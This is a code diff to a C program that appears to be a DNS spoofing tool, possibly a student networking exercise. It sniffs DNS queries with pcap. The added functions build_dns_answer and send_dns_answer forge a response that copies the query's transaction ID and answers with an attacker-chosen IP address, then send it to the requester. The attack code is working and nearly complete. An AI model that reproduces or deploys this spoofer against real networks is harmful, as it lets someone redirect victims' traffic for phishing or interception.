@@ -32,6 +32,7 @@
 #define PCAP_INTERFACENAME_SIZE 16
 #define FILTER_SIZE 200
 #define ETHER_ADDR_LEN  6
+#define ANSWER_SIZE 1500
 
 typedef struct _SpoofParams_ {
   char ip[IP_SIZE];                        /* ip address (xxx.xxx.xxx.xxx) */
@@ -46,7 +47,7 @@ struct etherhdr{
   u_short ether_type; /* network protocol */
 };
 
-/* DNS header */
+/* DNS header structure */
 struct dnshdr {
   char id[2];
   char flags[2];
@@ -56,15 +57,15 @@ struct dnshdr {
   char arcount[2];
 };
 
-/* Estrutura para uma pergunta DNS */
-struct dns_query {
+/* DNS query structure */
+struct dnsquery {
   char *qname;
   char qtype[2];
   char qclass[2];
 };
 
-/* Estrutura para uma resposta DNS */
-struct dns_reply {
+/* DNS answer structure */
+struct dnsanswer {
   char *name;
   char atype[2];
   char aclass[2];
@@ -113,7 +114,6 @@ void parse_args(int argc, char *argv[], SpoofParams *spoof_params){
  * Extracts the src ip from a ip header
  */
 void extract_ip_from_iphdr(struct iphdr* ip, char* request_ip){
-  
   int i;
   int aux[4];
   u_int32_t raw_ip;
@@ -124,17 +124,22 @@ void extract_ip_from_iphdr(struct iphdr* ip, char* request_ip){
   }
   
   sprintf(request_ip, "%d.%d.%d.%d",aux[0], aux[1], aux[2], aux[3]);
-  
+}
+
+/**
+ * Extracts the src port from a udp header
+ */
+void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
+  (*port) = ntohs((*(u_int16_t*)udp));
 }
 
 /**
  * Extracts DNS query and ip from packet
  */
-void extract_dns_data(const u_char *packet, struct dns_query *dns, char* request_ip){
+void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* request_ip, u_int16_t *port){
   struct etherhdr *ether;
   struct iphdr *ip;
   struct udphdr *udp;
-  struct dnshdr *dns_hdr;
   unsigned int ip_header_size;
   
   /* ethernet header */
@@ -147,25 +152,25 @@ void extract_dns_data(const u_char *packet, struct dns_query *dns, char* request
   /* udp header */
   ip_header_size = ip->ihl*4;
   udp = (struct udphdr *)(((char*) ip) + ip_header_size);
+  extract_port_from_udphdr(udp, port);
 
   /* dns header */
-  dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
+  *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
 
-  dns->qname = ((char*) dns_hdr) + sizeof(struct dnshdr);
+  dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
   
 }
 
 /**
  * Extracts the request from a dns query
  */
-void extract_dns_request(struct dns_query *dns, char *request){
+void extract_dns_request(struct dnsquery *dns_query, char *request){
   unsigned int i, j, k;
-  char *curr = dns->qname;
+  char *curr = dns_query->qname;
   unsigned int size;
   
   size = curr[0];
 
-  /* monta nome da pergunta */
   j=0;
   i=1;
   while(size > 0){
@@ -173,7 +178,7 @@ void extract_dns_request(struct dns_query *dns, char *request){
       request[j++] = curr[i+k];
     }
     request[j++]='.';
-    i+=size; /* reposiciona indice */
+    i+=size;
     size = curr[i++];
   }
   request[--j] = '\0';
@@ -186,22 +191,98 @@ void print_message(char* request, char* ip){
   printf("O host %s fez uma requisição a %s\n", ip, request);
 }
 
+void send_dns_answer(char* ip, u_int32_t port, char* packet, int packlen) {
+  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+  struct sockaddr_in to_addr;
+  int bytes_sent;
+
+  if (sock < 0) {
+    printf("Erro ao criar o socket");
+    return;
+  }
+  to_addr.sin_family = AF_INET;
+  to_addr.sin_port = htons(port);
+  printf("port %d\n",port);
+  to_addr.sin_addr.s_addr = inet_addr(ip);
+  printf("ip %s\n",ip);
+  bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
+  printf("bytes_sent: %d\n", bytes_sent);
+}
+
+/**
+ * Builds a DNS answer
+ */
+unsigned int build_dns_answer(SpoofParams *spoof_params, struct dnshdr *dns_hdr, char* answer, char* request){
+  
+  unsigned int size = 0; /* answer size */
+  struct dnsquery *dns_query;
+  in_addr_t inet_ip;
+  
+  unsigned char ans[4];
+  sscanf(spoof_params->ip, "%d.%d.%d.%d",(int *)&ans[0],(int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
+  
+  dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));
+  inet_ip = inet_addr(spoof_params->ip);
+  
+  printf("  ans  - %u%u%u%u\n", ans[0], ans[1], ans[2], ans[3]);
+  printf("  inet - %u\n", inet_ip);
+  //dns_hdr
+  memcpy(&answer[0], dns_hdr->id, 2); //id
+  memcpy(&answer[2], "\x81\x80", 2); //flags
+  memcpy(&answer[4], "\x00\x01", 2); //qdcount
+  memcpy(&answer[6], "\x00\x01", 2); //ancount
+  memcpy(&answer[8], "\x00\x00", 2); //nscount
+  memcpy(&answer[10], "\x00\x00", 2); //arcount
+
+  //dns_query
+  size = strlen(request)+2;
+  memcpy(&answer[12], dns_query, size); //qname
+  size+=12;
+  memcpy(&answer[size], "\x00\x01", 2); //type
+  size+=2;
+  memcpy(&answer[size], "\x00\x01", 2); //class
+  size+=2;
+
+  //dns_answer
+  memcpy(&answer[size], "\xc0\x0c", 2); //pointer to qname
+  size+=2;
+  memcpy(&answer[size], "\x00\x01", 2); //type
+  size+=2;
+  memcpy(&answer[size], "\x00\x01", 2); //class
+  size+=2;
+  memcpy(&answer[size], "\x00\x00\x00\x22", 4); //ttl - 34s
+  size+=4;
+  memcpy(&answer[size], "\x00\x04", 2); //rdata length
+  size+=2;
+  memcpy(&answer[size], ans, 4); //rdata
+  size+=4;
+  
+  return size;
+  
+}
+
 /**
  * Callback function to handle packets
  */
 void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
   SpoofParams *spoof_params;
-  struct dns_query dns;
+  struct dnsquery dns_query;
+  struct dnshdr *dns_hdr;
+
   char request[REQUEST_SIZE];
   char ip[IP_SIZE];
+  u_int16_t port;
+
+  char answer[ANSWER_SIZE];
+  unsigned int answer_size; 
   
   spoof_params = (SpoofParams*)args;
-  
-  extract_dns_data(packet, &dns, ip);
-  extract_dns_request(&dns, request);
+  extract_dns_data(packet, &dns_hdr, &dns_query, ip, &port);
+  extract_dns_request(&dns_query, request);
   
   if(!strcmp(request, spoof_params->request)){
-    //build_dns_answer(spoof_params, mais parametros aqui - ip );
+    answer_size = build_dns_answer(spoof_params, dns_hdr, answer, request);
+    send_dns_answer(ip, port, answer, answer_size);
     print_message(request, ip);
   }
 }
